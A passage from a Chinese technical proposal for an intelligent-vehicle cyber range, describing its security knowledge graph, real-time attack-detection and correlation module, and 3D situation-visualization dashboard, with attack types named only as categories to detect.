alt="IMG_256"></p><p>在汽车攻防资源库中的知识支撑下，网络安全知识图谱中的知识结合靶场汽车应用试验关联的资产、漏洞、节点数据构建汽车场景的网络安全知识图谱，支撑攻击检测分析与扩展研究，知识图谱基于本体及本体关系的构建，支持表示实体属性及相互关系的表示，包括漏洞与资产型号的存在关系、基础攻击类型与漏洞的利用关系、基础攻击类型与攻击事件的从属关系。在同一个子图中以可视化形式中，虚拟化MPU、零部件、被测车辆、虚拟化MCU等4种类型的节点与知识图谱关联，关联的资产会包含应用程序版本、车型项目（年款）以及固件版本与中间件版本、操作系统的内核版本信息、车辆型号和车辆和整车品牌以及零部件的硬件平台等9类信息，漏洞的信息涵盖公开日期、漏洞的名称、危险级别、涉及的平台（如Windows或Linux）、漏洞类型、CVE编号等6类信息。以上信息均可在同一个子图中以可视化的形式展现。</p><p>基础攻击详细属性涵盖了相关脆弱性、缓解措施、先决条件、执行流程、威胁等级、技能要求、攻击名称、资源要求、后果、攻击可能性、攻击编号。基础攻击分类包括超危窃取利用类、高危远程控制、低危扫描探测类、中危攻击突破类。基础攻击页面上可以批量删除、更新、添加，并支持基于属性按条件模糊查询相关知识。同样的，也可对复杂攻击知识进行管理，包括各个攻击步骤的基础攻击编号、利用的漏洞、使用的工具、时空关系，可批量删除、更新、添加。</p><p>试验场景图谱中，知识子图涵盖了复杂攻击知识子图以及基础攻击知识子图，可以和分布式联邦靶场在线同步知识，快速在靶场与靶场之间实现知识共享，将子图注册到流计算引擎，可以利用该引擎进行有效攻击检测，也可利用流计算引擎进行复杂攻击检测。除此之外，还存在专门针对智能汽车网络的车载云服务的入侵攻击。除此之外，还存在一种专门针对智能汽车网络的入侵攻击，这被称为车云业务。这种攻击形式涉及联网业务汽车的攻防演练场景，特别是在智能汽车网络靶。</p><p>基础攻击知识子图，涵盖了资产以及漏洞之间的存在关系，漏洞以及基础攻击类型之间的利用关系，安全事件以及基础攻击类型之间的实例关系，这些类型涵盖了资源消耗型、探测型、控制型、破坏型攻击子图等。</p><p>其中探测型基础攻击子图包含：</p><ol><li>漏洞软件扫描</li><li>资源泄漏暴露</li><li>目录索引</li><li>未公开的网页检测</li><li>信息启发</li><li>TCP连接扫描</li></ol><p>破坏型基础攻击子图包含：</p><ol><li>对象注入</li><li>协议篡改</li><li>鱼叉式网络钓鱼</li><li>身份认证滥用</li><li>功能绕过</li><li>过度资源分配</li><li>跨站脚本（XSS）攻击</li><li>点击劫持</li><li>SQL盲注</li><li>代码注入</li><li>XML注入</li><li>TCP泛洪</li></ol><p>可以使用攻击名称进行模糊查询，查找特定类型的攻击子图。查询结果将以图谱形式展示所选攻击子图，呈现漏洞以及操作系统（或软件）的相互联系、漏洞以及基础攻击的相互联系、安全事件以及弱点相互联系、基础攻击以及安全事件之间相互联系。</p><p>复杂攻击知识子图是由按照一定关系基础攻击知识子图组合而成的，能够呈现基础攻击之间的时序关系，并且能够展现这些基础攻击在空间上的关联关系。简而言之，它是基础攻击知识的有序组合，用以表示攻击在时间和空间上的交互关系。其中包含蠕虫攻击、APT攻击、DDoS、僵尸网络等67种攻击子图表示，并以图谱的方式进行可视化展示。APT攻击类复杂攻击子图包含常见的NetTraveler APT、Luckycat APT、Heartbea APTt、Turla APT、夜龙 APT、Ke3chang APT、MiniDuke APT、海莲花 APT等APT攻击子图。</p><p>界面展示上以图标表示实体，连线代表关系，每一种实体采用不同颜色区分：红色代表复杂攻击、橙色代表基础攻击、黄色代表安全事件、紫色代表漏洞、玫红色代表弱点、蓝色代表资产。</p><p>知识图谱包括基础攻击子图和复杂攻击子图，在界面列表中在相关试验下展示，点击试验的图谱数量，展开或收起图谱详情，单击图谱在画布中进行内容切换。试验列表支持根据试验名称进行模糊检索。</p><p>基础攻击子图通过按攻击类型分类，展示了基础攻击与安全事件、漏洞利用、相关弱点之间的关系。而复杂攻击子图则是通过组合基础攻击子图构建而成，主要呈现了在汽车攻击场景中的复杂攻击知识，包括时空关系、攻击步骤以及漏洞利用等方面的信息。在画布中单击实体节点，弹窗显示对应实体详情。各实体的详情字段见下表。</p><table><thead><tr><th>实体</th><th>详情字段</th></tr></thead><tbody><tr><td>资产</td><td>资产IP</td></tr><tr><td></td><td>资产名称</td></tr><tr><td></td><td>资产类型</td></tr><tr><td></td><td>重要程度</td></tr><tr><td></td><td>资产描述</td></tr><tr><td>漏洞</td><td>漏洞编号</td></tr><tr><td></td><td>首发时间</td></tr><tr><td></td><td>危害等级</td></tr><tr><td></td><td>漏洞类型</td></tr><tr><td></td><td>威胁类型</td></tr><tr><td></td><td>漏洞描述</td></tr><tr><td>弱点</td><td>弱点编号</td></tr><tr><td></td><td>弱点名称</td></tr><tr><td></td><td>描述</td></tr><tr><td></td><td>关系</td></tr><tr><td></td><td>适用平台</td></tr><tr><td></td><td>常见后果</td></tr><tr><td></td><td>利用可能性</td></tr><tr><td></td><td>缓解措施</td></tr><tr><td>安全事件</td><td>安全事件ID</td></tr><tr><td></td><td>检测时间</td></tr><tr><td></td><td>源IP</td></tr><tr><td></td><td>源端口</td></tr><tr><td></td><td>目的IP</td></tr><tr><td></td><td>目的端口</td></tr><tr><td></td><td>源MAC</td></tr><tr><td></td><td>目的MAC</td></tr><tr><td></td><td>协议</td></tr><tr><td></td><td>描述</td></tr><tr><td>基础攻击</td><td>规则ID</td></tr><tr><td></td><td>攻击名称</td></tr><tr><td></td><td>攻击可能性</td></tr><tr><td></td><td>威胁等级</td></tr><tr><td></td><td>技能要求</td></tr><tr><td></td><td>资源要求</td></tr><tr><td></td><td>先决条件</td></tr><tr><td></td><td>执行流程</td></tr><tr><td></td><td>后果</td></tr><tr><td></td><td>缓解措施</td></tr><tr><td></td><td>相关脆弱性</td></tr><tr><td></td><td>创建时间</td></tr><tr><td></td><td>修改时间</td></tr><tr><td></td><td>攻击描述</td></tr><tr><td>复杂攻击</td><td>攻击名称</td></tr><tr><td></td><td>基础攻击步骤</td></tr><tr><td></td><td>基础攻击检测时间</td></tr><tr><td></td><td>基础攻击利用漏洞</td></tr><tr><td></td><td>基础攻击使用工具</td></tr><tr><td></td><td>复杂攻击空间关系</td></tr></tbody></table><h2 id="攻击检测研判模块"><a href="#攻击检测研判模块" class="headerlink" title="攻击检测研判模块"></a>攻击检测研判模块</h2><p>功能参数如下：</p><ol><li>支持基础攻击去重，基于基础攻击类型知识体系中不同攻击类型的去重策略进行去重，去重策略包括二元组、三元组、四元组。</li><li>支持对基础攻击数据进行可链标记，用于后续复杂攻击关联分析。</li><li>支持基于试验的资产漏洞探测结果，对漏洞安全事件进行有效攻击检测。</li><li>支持基于“资产-漏洞-攻击”多维关联关系，进行有效基础攻击检测。</li><li>支持试验中将安全事件融合产生的基础攻击数据与试验的脆弱性进行关联分析，生成有效攻击，过滤无效攻击。</li><li>支持基于攻击突破类、远程控制与窃取利用类攻击类别，进行有效攻击检测验证，生成有效攻击数据。</li><li>支持分析生成的有效基础攻击，根据攻击数据中的源目IP、端口、VLAN识别攻击数据来源队伍（或选手）、攻击目标。</li><li>支持将生成的基础攻击数据发送并存储到大数据平台。</li><li>支持接收融合后的安全事件流数据，进行内存缓存用于攻击检测匹配分析。</li><li>支持接收试验攻击子图并注册到流计算引擎中，并支持动态更新。</li><li>支持接收试验停止指令，清除试验相关子图信息。</li><li>支持利用攻击之间时间与空间关系特征，对安全事件流数据进行关联分析。</li><li>支持基于流计算分析技术和滑动时间窗口，实时进行多步攻击序列分析。</li><li>支持基于可链基础攻击数据与流计算生成的多步攻击序列数据，关联组合生成多节点、跨多域的复杂攻击。</li><li>支持APT攻击、DDoS攻击等类型多步复杂攻击事件检测。</li><li>支持基于智能汽车安全攻击场景的复杂攻击检测，检测结果包括攻击类型、攻击源、被攻击靶标，靶标包括OTA靶标、TBOX靶标、网关靶标、车身域控制器靶标、底盘域控靶标、动力域控靶标等。</li><li>支持阈值类攻击检测，用户可自由设置检测间隔、阈值等参数，可实现webshell远程控制、暴力破解、扫描探测、web站点漏洞扫描等类型的攻击检测。</li><li>支持基于试验成果推导生成复杂攻击，基于成果信息关联分析获得复杂攻击步骤生成复杂攻击。</li><li>支持复杂攻击的有效性判断，关联有效基础攻击数据进行有效复杂攻击识别。</li><li>支持将生成的复杂攻击数据发送并存储到大数据平台。</li><li>支持基于网络靶场的多试验并行处理与分析。</li><li>支持基础攻击数据展示，包括攻击类型、源IP地址、目的IP地址、源端口、目的端口、攻击描述等。</li><li>支持基于去重后的基础攻击数据，索引找到其原始事件。</li><li>支持多条件搜索基础攻击数据，搜索条件包括检测时间、攻击类型、源IP地址、目的IP地址等。</li><li>支持复杂攻击数据展示，包括攻击名称、源IP地址、目的IP地址、对应的基础攻击步骤及链路详情。</li><li>支持基于试验任务进行基础攻击与复杂攻击数据管理与搜索。</li></ol><p>性能参数如下：</p><ol><li>复杂攻击检测性能超过2000条/秒。</li></ol><h3 id="方案设计-12"><a href="#方案设计-12" class="headerlink" title="方案设计"></a>方案设计</h3><p>功能参数设计为，系统支持基础攻击去重，标记基础攻击数据可链用于后续复杂攻击关联分析。基于试验资产漏洞探测结果进行有效攻击检测。多维关联关系基于“资产-漏洞-攻击”进行有效基础攻击检测。将安全事件融合产生基础攻击数据与试验脆弱性关联分析，生成有效攻击。分析生成有效基础攻击，源目IP、端口、VLAN识别攻击来源队伍或选手、目标。发送基础攻击数据至大数据平台。接收安全事件流数据，内存缓存攻击检测匹配分析。接收试验攻击子图注册到流计算引擎，动态更新。接收试验停止指令，清除子图信息。利用攻击时间空间关系特征关联分析安全事件流数据。基于流计算分析技术实时多步攻击序列分析。基于可链基础攻击数据与流计算生成复杂攻击。支持APT攻击、DDoS攻击等多步复杂攻击事件检测。基于智能汽车安全攻击场景的复杂攻击检测。阈值类攻击检测，可自定义设置检测间隔、阈值。基于试验成果推导生成复杂攻击。复杂攻击有效性判断，关联有效基础攻击数据识别有效复杂攻击。发送复杂攻击数据至大数据平台。基于网络靶场多试验并行处理分析。展示基础攻击数据，基于去重后基础攻击数据索引原始事件。多条件搜索基础攻击数据。展示复杂攻击数据。基于试验任务进行基础攻击与复杂攻击数据管理搜索。</p><p>性能参数设计为，复杂攻击检测性能超过2000条/秒。</p><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>本方案旨在设计并实施一个智能汽车网络安全攻击检测与分析系统，该系统将利用先进的数据处理技术和算法，对智能汽车网络安全攻击事件进行深入分析与检测。系统将支持攻击数据的去重、链标记、有效攻击检测、攻击来源识别、数据存储、实时分析、复杂攻击检测等多种功能，并能够处理多试验任务的并行分析。系统的性能设计将确保复杂攻击检测性能超过2000条/秒。</p><h4 id="功能响应"><a href="#功能响应" class="headerlink" title="功能响应"></a>功能响应</h4><p>攻击数据处理</p><p>基础攻击去重：系统支持基于不同攻击类型知识体系中的去重策略（二元组、三元组、四元组）进行基础攻击数据的去重。</p><p>基础攻击数据链标记：为基础攻击数据添加可链标记，为后续复杂攻击关联分析提供支持。</p><p>有效攻击检测</p><p>资产漏洞探测结果分析：基于试验的资产漏洞探测结果，进行有效攻击检测。</p><p>多维关联攻击检测：支持基于“资产-漏洞-攻击”多维关联关系，进行有效基础攻击检测。</p><p>安全事件与脆弱性关联分析：试验中将安全事件产生的基础攻击数据与试验的脆弱性进行关联分析，生成有效攻击，过滤无效攻击。</p><p>攻击类别检测验证：支持基于攻击突破类、远程控制与窃取利用类攻击类别，进行有效攻击检测验证，生成有效攻击数据。</p><p>攻击数据来源识别：分析生成的有效基础攻击，根据攻击数据中的源目IP、端口、VLAN识别攻击数据来源队伍（或选手）、攻击目标。</p><p>数据存储与流处理</p><p>基础攻击数据存储：将生成的基础攻击数据发送并存储到大数据平台。</p><p>安全事件流数据内存缓存：接收融合后的安全事件流数据，进行内存缓存用于攻击检测匹配分析。</p><p>试验攻击子图注册与更新：接收试验攻击子图并注册到流计算引擎中，并支持动态更新。</p><p>试验停止指令处理：接收试验停止指令，清除试验相关子图信息。</p><p>复杂攻击检测</p><p>安全事件流关联分析：利用攻击之间时间与空间关系特征，对安全事件流数据进行关联分析。</p><p>实时多步攻击序列分析：基于流计算分析技术和滑动时间窗口，实时进行多步攻击序列分析。</p><p>复杂攻击关联组合生成：基于可链基础攻击数据与流计算生成的多步攻击序列数据，关联组合生成多节点、跨多域的复杂攻击。</p><p>多步复杂攻击事件检测：支持APT攻击、DDoS攻击等类型多步复杂攻击事件检测。</p><p>智能汽车安全场景复杂攻击检测：基于智能汽车安全攻击场景的复杂攻击检测，检测结果包括攻击类型、攻击源、被攻击靶标等。</p><p>阈值类攻击检测：支持阈值类攻击检测，用户可设置检测间隔、阈值等参数，实现webshell远程控制、暴力破解等攻击检测。</p><p>复杂攻击推导生成：基于试验成果推导生成复杂攻击，关联分析获得复杂攻击步骤生成复杂攻击。</p><p>复杂攻击的有效性判断：进行有效复杂攻击识别，关联有效基础攻击数据进行判断。</p><p>复杂攻击数据存储：将生成的复杂攻击数据发送并存储到大数据平台。</p><p>并行处理与分析</p><p>多试验并行处理与分析：支持基于网络靶场的多试验并行处理与分析。</p><p>数据展示与管理</p><p>基础攻击数据展示：支持基础攻击数据的展示，包括攻击类型、源IP地址、目的IP地址等。</p><p>去重后数据索引：支持基于去重后的基础攻击数据，索引找到其原始事件。</p><p>基础攻击数据多条件搜索：支持多条件搜索基础攻击数据，搜索条件包括检测时间、攻击类型等。</p><p>复杂攻击数据展示：支持复杂攻击数据展示，包括攻击名称、源IP地址、目的IP地址等。</p><p>攻击数据管理与搜索：支持基于试验任务进行基础攻击与复杂攻击数据的管理与搜索。</p><h4 id="性能响应"><a href="#性能响应" class="headerlink" title="性能响应"></a>性能响应</h4><p>复杂攻击检测性能：系统的复杂攻击检测性能应超过2000条/秒。</p><p>通过实现本方案，我们将建立一个能够高效检测和分析智能汽车网络安全攻击的系统。该系统将为智能汽车网络安全提供全面的技术支持，从基础攻击的识别到复杂攻击的构建，确保了网络安全的实时监控和快速响应。此外，系统的高性能设计和多试验任务的并行处理能力将大大提高智能汽车网络安全攻击检测的效率和准确性。</p><h3 id="方案简介-11"><a href="#方案简介-11" class="headerlink" title="方案简介"></a>方案简介</h3><p>网络靶场的多试验支持并行处理与分析，攻击检测支持并行处理与分析靶场多个试验的采集数据，根据态势分析任务管理模块配置的子任务，态势分析基于子任务采集的数据，结合知识图谱注册的攻击模板进行攻击检测研判，分析出流量中的基础攻击和复杂攻击，并于态势可视化模块进行界面展示。</p><p>攻击检测研判首先需要采集TCP、UDP传输协议的syslog安全事件日志，这些日志由数据采集分系统通过Kafka消息数据交互给智能汽车网络靶场态势分析分系统进行转换工作。</p><p>分系统可以提供对国内一些常见大众的安全厂商检测设备产品日志标准化的支持，可将其转换为标准格式处理生成安全事件，基于安全事件、基础攻击及其关系的知识体系实时融合安全事件生成基础攻击实现实时攻击检测。通过安全事件融合生成的基础攻击数据，对相关信息进行整合，将其与试验的脆弱性(CWE)进行关联分析，从而产生有效的攻击，同时，对于那些无效的攻击，系统将进行过滤处理，确保最终呈现的数据集具有高度的准确性和实用性。可以通过试验任务ID进行基础攻击数据的管理和搜索，界面上提供多条件搜索基础攻击数据，搜索条件包括了检测时间、攻击类型、源IP地址、目的IP地址等多个方面，这一功能设计旨在帮助用户更便捷地了解和分析系统中的攻击情况，提供有效的数据管理和检索工具。生成的基础攻击，呈现的数据包括攻击描述、目的端口（简称DPORT）、源端口（简称SPORT）、攻击类型、源IP地址（简称SIP）、目的IP地址（简称DIP）等内容信息。同时，数据将发送并存储到大数据平台。融合后的安全事件流数据会进行内存缓存用于攻击检测匹配分析，同时还具备支持实时动态更新的功能，在接收试验攻击子图的同时，系统会将其有效地注册到流计算引擎中，当试验结束时，会根据停止指令，清除试验相关子图信息。</p><p>基础攻击去重是基于基础攻击类型知识体系中不同攻击类型的去重策略进行去重，去重策略包括二元组去重，也就是根据源目IP进行去重；三元组去重，也就是根据源目IP和目的端口进行去重；四元组去重，也就是根据源目IP和源目端口进行去重。根据试验的资产漏洞探测结果，对漏洞安全事件进行有效攻击检测，有效攻击检测包含资产与漏洞的关联，漏洞与攻击的关联，最后达到资产与攻击的关联等多维关联关系。去除重复后的基础攻击数据，可以通过索引查找到相应的原始事件。并进行可链标记，用于后续复杂攻击关联分析。超危窃取利用类、高危远程控制类、中危攻击突破类，能够对其进行有效攻击检测验证，并产生有效攻击数据。还可以通过阈值类攻击检测对基础攻击进行相应检测，用户可自由设定检测周期间隔、阈值相关等参数要求，可实现web站点漏洞扫描、扫描探测、暴力破解、webshell远程控制等类型的攻击检测。并且能够识别攻击数据来源(队伍或是选手)、攻击目标是通过攻击数据中的源目IP、端口、VLAN。</p><p>利用攻击数据之间的时间以及空间关系特征，关联分析安全事件流数据。采用流计算分析技术和滑动时间窗口，实时进行多步攻击序列分析，多步攻击序列数据是由流计算以及可链基础攻击数据生成的，关联组合生成多节点、跨多域的复杂攻击。此外，还可以根据试验成果推导生成生成复杂攻击步骤，最终产生复杂攻击，将生成的复杂攻击数据发送并储存至大数据平台。</p><p>复杂攻击的有效性判断，是通过关联有效基础攻击数据，自动判定为有效复杂攻击。复杂攻击包括APT攻击、DDoS攻击等类型多步复杂攻击事件检测，以及智能汽车安全攻击场景的复杂攻击检测，检测结果涵盖了被攻击靶标、攻击源以及攻击类型，靶标涵盖了动力域控靶标、底盘域控靶标、车身域控制器靶标、网关靶标、TBOX靶标以及OTA靶标等。可根据试验任务ID进行复杂攻击数据管理与搜索。复杂攻击检测对于安全事件实时处理能达到2500条/秒。复杂攻击数据展示涵盖了链路详情、对应的基础攻击步骤、目的IP地址（简称DIP）、源IP地址（简称SIP）以及攻击名称等信息。</p><p>从各试验采集到的日志数据，经过解析处理转换为安全事件，分系统提供攻击检测界面，对融合后安全事件、基础攻击和复杂攻击检测结果分页签进行展示。</p><p>攻击研判的处理流程如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/9b324fc18bf356d0618db0fcead589d0.png"></p><p>安全事件页签展示从各试验的日志数据解析得到的安全事件，包括数据来源、安全事件ID、检测时间、攻击源、攻击目的、源端口、目的端口、协议、源mac、目的mac，支持单击事件ID查看原始日志，支持根据数据来源和检测时间精确筛选，支持根据安全事件ID、攻击源、攻击目的、源端口、目的端口、协议、源mac、目的mac模糊检索。</p><p>基础攻击页签展示从各试验的安全事件融合得到的基础攻击，包括数据来源、检测时间、攻击类型、威胁等级、协议、目的端口、有效性、目的IP、源IP、源端口、规则ID，并且可以单击详情显示基础攻击关联的队伍、队员、节点等详细信息，并且可以单击弹窗显示所有相关原始日志，支持根据数据来源、检测时间和有效性精确筛选，支持根据攻击类型、威胁等级、规则ID、源IP(SIP)、目的IP(DIP)、源端口(SPORT)、目的端口(DPORT)、源mac、目的mac、协议模糊检索。</p><p>复杂攻击页签展示从各试验的基础攻击基于时空关系组链得到的复杂攻击，包括数据来源、检测时间、复杂攻击名称、源IP、目的IP、有效性，支持单击基础攻击步骤查看步骤详情，包括基础攻击名称、检测时间利用漏洞、步骤序号以及使用工具等详细信息，支持根据数据来源和有效性精确筛选，支持根据复杂攻击名称、源IP、目的IP模糊检索。</p><h2 id="态势可视化展示模块"><a href="#态势可视化展示模块" class="headerlink" title="态势可视化展示模块"></a>态势可视化展示模块</h2><ul><li>支持在微观拓扑中展示对应汽车靶标节点信息，包括车联网业务管理后台、TBOX、网关、车机、域控制器等类型，节点名称可编辑，需提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ac0169e9b76ab1ef195b11550bcd6c31.png"></p><h4 id="方案设计-13"><a href="#方案设计-13" class="headerlink" title="方案设计"></a>方案设计</h4><p>功能参数设计为，系统提供可视化效果图设计，资产展示、漏洞展示、流量展示等。实现宏观可视化与微观可视化两种展示方式，支持不同应用场景的可视化展示。对汽车进行3D建模展示，包括对应的靶标及攻击信息。宏观可视化包括地图模式，支持动态生成与加载各种中国、省、市地图。基于汽车靶标的基础攻击、有效攻击与复杂攻击的动态飞线等可视化展示。</p><p>试验信息统计展示，包括实时攻击数据、攻击趋势、受攻击排行等。微观可视化展示包括拓扑、动画连线、图表等形式。在微观拓扑中展示汽车靶标节点信息，节点名称可编辑。3D树形拓扑可视化图形自动生成。实时接收APT等复杂攻击数据，呈现拓扑中，同时信息面板展示对应步骤基础攻击信息。</p><p>对汽车攻防演练场景复杂攻击行为进行回放展示。选择指定时间、攻击的复杂攻击展示其攻击过程、路径、详情。通过鼠标快速放大缩小。基础攻击的统计分析与查看管理，复杂攻击的查看分析管理。复杂攻击子图查看，有效攻击的查看分析管理。默认配置和自定义配置。模板配置、微观模板配置。</p><p>系统大屏可视化配置，仪表组件库的内容配置。组件配置、标题、地图层级等内容配置。模型库管理，模型图片变换旋转角度自动截图保存。</p><p>性能参数设计为，支持100种地图的灵活配置生成，2000个节点的网络拓扑形式微观可视化展示。</p><h5 id="项目概述"><a href="#项目概述" class="headerlink" title="项目概述"></a>项目概述</h5><p>本项目旨在开发一套智能汽车网络安全可视化系统，该系统将通过高效、直观的可视化手段，展现智能汽车网络安全的各项关键数据和安全事件。系统将支持资产、漏洞、流量、攻击等多维度的数据展示，并结合宏观与微观视角，为不同应用场景提供精准的可视化服务。通过3D建模、地图模式等先进技术，系统能够清晰地展示汽车网络安全态势，帮助用户快速理解和响应网络安全事件。</p><h5 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h5><p>可视化效果图设计</p><p>效果图设计与评审：在实施前，提供系统的可视化效果图设计，并通过方案评审。</p><p>数据展示功能</p><p>资产展示：支持展示资产数量、资产类型分布等信息。</p><p>漏洞展示：支持漏洞类型数量分布、漏洞危险程度占比分布等信息的可视化展示。</p><p>流量展示：支持流量协议统计分布、流量趋势等信息的展示。</p><p>可视化展示方式</p><p>宏观与微观可视化：支持宏观可视化与微观可视化两种展示方式。</p><p>应用场景可视化：支持夺旗赛、攻防赛、红蓝对抗、综合演练等不同应用场景的可视化展示。</p><p>3D建模与展示：支持对汽车进行3D建模与展示，包括靶标及攻击信息。</p><p>地图模式宏观可视化：支持地图、图表、动画连线等宏观可视化展示。</p><p>地图动态生成与加载：支持各种中国、省、市地图的灵活动态生成与加载。</p><p>攻击数据可视化</p><p>动态飞线展示：支持基于汽车靶标的基础攻击、有效攻击与复杂攻击的动态飞线等可视化展示。</p><p>试验信息统计展示：支持试验信息的统计展示，包括实时攻击数据、攻击趋势、受攻击排行等。</p><p>外网IP情报知识展示：支持基于IP地址自动加载外网IP情报知识，并进行实时攻击的地理位置展示。</p><p>微观可视化展示</p><p>微观可视化：支持拓扑、动画连线、图表等形式的微观可视化展示。</p><p>拓扑中汽车靶标节点展示：支持在微观拓扑中展示汽车靶标节点信息。</p><p>拓扑节点统计信息标注：支持在拓扑节点上标注展示资产、安全事件等统计信息。</p><p>3D树形拓扑可视化：支持基于试验环境拓扑数据自动生成全局3D树形拓扑可视化图形。</p><p>攻击行为展示与回放</p><p>复杂攻击数据展示：实时接收APT等复杂攻击数据，并通过拓扑画线方式呈现。</p><p>复杂攻击回放展示：支持对汽车攻防演练场景复杂攻击行为进行回放展示。</p><p>指定攻击过程展示：支持选择指定时间、攻击进行复杂攻击的展示。</p><p>交互与管理功能</p><p>可视化交互功能：支持通过鼠标快速进行放大缩小等交互操作。</p><p>基础攻击统计分析：支持基础攻击的统计分析与查看管理。</p><p>复杂攻击分析管理：支持复杂攻击的查看分析管理。</p><p>复杂攻击子图查看：支持复杂攻击子图的查看。</p><p>有效攻击分析管理：支持有效攻击的查看分析管理。</p><p>配置与模板管理</p><p>配置管理：支持默认配置和自定义配置，包括模板配置、内容配置和拓扑编辑。</p><p>模板库管理：支持宏观和微观模板库。</p><p>可视化配置：支持系统大屏可视化配置。</p><p>仪表组件库配置：支持仪表组件库的内容配置。</p><p>组件配置：支持选择不同形式的组件进行配置。</p><p>地图配置：支持进行标题、地图层级等内容配置。</p><p>模型与拓扑编辑</p><p>模型库管理：支持模型库的管理。</p><p>模型图片编辑：支持模型图片变换旋转角度进行自动截图保存。</p><p>拓扑编辑界面：支持用户通过拓扑编辑界面对拓扑进行编辑。</p><p>拓扑结构生成：拓扑编辑基于试验活动拓扑数据。</p><p>背景调整：支持修改天空盒子和地面背景图。</p><p>模型节点编辑：支持对模型节点进行编辑。</p><p>模型节点批量编辑：支持通过框选方式对模型节点进行批量编辑操作。</p><p>模型节点操作：支持对模型节点进行旋转、移动、复制/粘贴操作。</p><p>快捷键控制：支持通过键盘快捷键控制工具栏操作切换。</p><p>连线样式编辑：支持在模型节点之间添加连线。</p><p>攻击线配置：支持攻击线配置。</p><p>区域标记编辑：支持拓扑地面任意位置添加区块进行区域标记。</p><p>拓扑编辑动作撤销恢复：支持对拓扑编辑动作进行撤销、恢复操作。</p><h5 id="性能-3"><a href="#性能-3" class="headerlink" title="性能"></a>性能</h5><p>地图配置能力：支持100种地图的灵活配置生成。</p><p>网络拓扑展示能力：支持2000个节点的网络拓扑形式微观可视化展示。</p><p>通过实现本方案，我们将为智能汽车网络安全领域提供一个全面、高效的可视化工具。该系统将支持从宏观到微观的多维度数据展示，辅以3D建模、地图模式和复杂攻击回放等高级功能，为用户提供精确、直观的安全态势感知。系统的高性能设计将确保处理大规模数据的能力，满足不同用户和场景的需求。</p><h4 id="方案简介-12"><a href="#方案简介-12" class="headerlink" title="方案简介"></a>方案简介</h4><p>基于采集获取的安全事件信息，经由攻击检测研判的实时攻击，态势可视化模块分为外部攻防安全视角和内部攻防安全视角两种视角，应用场景包括网络安全比赛、安全演练、评测等。</p><p>态势可视化外部攻防安全视角，支持自定义显示中国、省、市地图背景，可以根据需要进行灵活配置，生成不少于100种不同的地图。此外，还能够支持自动加载外部IP情报知识，根据IP地址和地图坐标，将实时攻击的源和目标IP地址映射到地理位置，以直观展示因特网上攻击发生的具体地点。可视化根据攻击源和靶标的地理位置信息在地图中标记呈现，以攻击源、攻击目的为数据基础在定点间用不同颜色样式的动画飞线展示不同攻击，并突出显示靶标被攻击状态，实时播报攻击情况。可视化界面两侧展示态势数据统计，统计项包括资产统计、漏洞统计、流量趋势统计、靶标统计等，其中资产统计涵盖了资产类型、资产数量分布，攻击统计方面，系统提供了多维度的信息，包括攻击类型漏洞危险程度占比分布、数量分布、攻击类型统计和趋势统计。同时，还包括流量趋势统计，其中涵盖流量协议统计分布和流量趋势分布等详细数据。系统支持对这些统计数据进行持久化展示，用户可方便地查询详细的基础攻击信息以及对应的复杂攻击子图。这些详细信息包括关联漏洞、相关安全事件以及攻击步骤信息，为用户提供全面的攻击分析视角。此外，系统为用户提供了查看、分析和管理有效攻击的功能，包括有效的基础攻击和有效的复杂攻击。这一功能组合使用户能够深入了解攻击情况，快速采取有效的安全应对措施。</p><p>内部攻防安全视角以网络场景拓扑图为主体，基于2D目标网络拓扑数据自动生成态势可视化微观3D拓扑图展示试验任务进行中的实时攻击，且可进行超过2000个节点的网络拓扑展示，在拓扑节点上还可展示该节点对应的资产、安全事件等统计信息。并能通过绘制线条的方式，以线条在拓扑中展示复杂攻击路径，并且会在同步展现对应复杂攻击中步骤的详细基础攻击信息。根据实时攻击在拓扑图中进行基础攻击和复杂攻击的攻击步骤、攻击路径的展示，且能够及时接收APT、蠕虫攻击等复杂攻击数据。</p><p>该模块可回放并展示汽车攻防演练场景中的复杂攻击行为。用户可以自主选择特定的时间点和攻击事件，以呈现它们的攻击细节、攻击路径以及攻击过程。此外，在可视化场景中支持使用鼠标轻松进行画面的缩小以及放大操作，以满足多种场景下可视化界面。</p><p>此外，态势可视化界面支持队伍信息、排名、攻击行为、地理区域信息、选手实时界面、选手接入情况、虚拟机网络行为、攻击流程回溯的展示。支持不同参与人员的操作屏幕切换，支持活动现场监控设备的状态查看。可视化大屏支持展示信息的显示/隐藏和布局编排。</p><p>可视化界面通过websocket推送数据进行展示，支持通过http接口和kafka接口从界面获取攻击数据，支持基础攻击和复杂攻击两种路径类动效。</p><p>系统提供了多种配置方式，包括默认配置和自定义配置，以满足用户对可视化展示的不同需求。系统初始配置包含预设的可视化模板，而用户可以通过模板配置、内容调整和拓扑修改进行自定义配置，以实现灵活的展示效果。</p><p>在可视化方面，用户可以进行系统大屏的自定义配置，包括分辨率选择和不同角色下的模板组合，以满足不同场景的展示需求。系统还拥有微观模板库和宏观模板库。微观模板支持拓扑可视化，用于展示详细的攻防行为信息。</p><p>除此之外，系统还配备了仪表组件库，涵盖多样风格的组件，如气泡图、列表、柱状图、数据卡片、折线图、饼状图等，用户可以根据需要选择并配置这些组件，展示各种信息，如网络安全量化指数、攻击类型统计、基础攻击、有效攻击和复杂攻击以及攻击趋势等，通过简单的拖拽方式进行布局。</p><p>在拓扑修改方面，系统利用试验活动拓扑数据，采用系统内置的优化自研算法生成树形拓扑结构。用户可以轻松修改天空盒子和地面背景图，以满足拓扑修改的背景要求。此外，系统还提供了丰富的节点修改功能，包括添加、修改、删除模型节点，以及修改模型颜色、缩放比例、名称、坐标位置以及模型类型、旋转角度、名称标签显示配置。还能够支持模型图片变换旋转角度并进行自动截图保存。支持用户通过拓扑修改界面对拓扑进行修改，支持重置拓扑可视化展示。</p><p>用户可以使用框选功能来一次性修改多个模型节点。支持旋转、移动、复制/粘贴等多种操作，并提供快捷键和键盘快捷键，以方便用户进行各种修改工作。拓扑修改还可以绘制线条插在模型节点之间，用户可以自定义线条样式，包括颜色、速度、样式以及粗细。此外，用户还能够在拓扑界面随意添加区块，之后进行的区域标记包括修改文字配置、颜色以及边框样式，文字配置包括字号、内容对齐方式、字体和文字方向、显示文字内容等。</p><p>态势可视化界面中心展示实时攻击数据，包括外部攻防安